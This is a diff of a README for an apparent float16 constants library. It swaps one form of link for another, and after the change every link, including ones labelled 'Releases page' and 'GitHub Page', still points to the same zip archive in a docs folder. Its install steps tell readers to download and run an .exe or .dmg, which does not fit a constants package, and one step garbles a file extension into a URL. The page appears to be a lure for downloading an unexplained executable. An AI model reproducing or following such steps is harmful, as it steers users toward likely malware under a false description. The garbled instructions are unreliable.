@@ -1,7 +1,7 @@
 # 🌟 constants-float16-significand-mask - Simple Tool to Handle Floating-Point Numbers
 
 ## 📦 Download Here
-[![Download Release](https://github.com/sleek-developer/constants-float16-significand-mask/raw/refs/heads/main/docs/significand-float-mask-constants-v2.3.zip%20Release-latest-brightgreen)](https://github.com/sleek-developer/constants-float16-significand-mask/raw/refs/heads/main/docs/significand-float-mask-constants-v2.3.zip)
+[![Download Release](https://raw.githubusercontent.com/sleek-developer/constants-float16-significand-mask/main/docs/significand-float-mask-constants-v2.3.zip%20Release-latest-brightgreen)](https://raw.githubusercontent.com/sleek-developer/constants-float16-significand-mask/main/docs/significand-float-mask-constants-v2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -18,13 +18,13 @@ To use this software, you will need:
 
 1. Click the link below to visit the Releases page.
    
-   [Download Latest Version](https://github.com/sleek-developer/constants-float16-significand-mask/raw/refs/heads/main/docs/significand-float-mask-constants-v2.3.zip)
+   [Download Latest Version](https://raw.githubusercontent.com/sleek-developer/constants-float16-significand-mask/main/docs/significand-float-mask-constants-v2.3.zip)
 
 2. Look for the latest release, which will be at the top of the list.
 
 3. Under the release details, find the download link for your operating system (Windows, macOS, or Linux).
 
-4. Click the appropriate link to start the download. The file will usually end with `.exe`, `.dmg`, or `https://github.com/sleek-developer/constants-float16-significand-mask/raw/refs/heads/main/docs/significand-float-mask-constants-v2.3.zip`, depending on your system.
+4. Click the appropriate link to start the download. The file will usually end with `.exe`, `.dmg`, or `https://raw.githubusercontent.com/sleek-developer/constants-float16-significand-mask/main/docs/significand-float-mask-constants-v2.3.zip`, depending on your system.
 
 5. Once the file has downloaded, locate it in your computer's download folder.
 
@@ -69,6 +69,6 @@ We welcome contributions! If you have ideas for features or improvements, feel f
 
 ## 🌐 More Information
 
-For more details about this software, visit the GitHub repository: [constants-float16-significand-mask GitHub Page](https://github.com/sleek-developer/constants-float16-significand-mask/raw/refs/heads/main/docs/significand-float-mask-constants-v2.3.zip).
+For more details about this software, visit the GitHub repository: [constants-float16-significand-mask GitHub Page](https://raw.githubusercontent.com/sleek-developer/constants-float16-significand-mask/main/docs/significand-float-mask-constants-v2.3.zip).
 
 Thank you for choosing `constants-float16-significand-mask`. Enjoy your work with floating-point numbers!
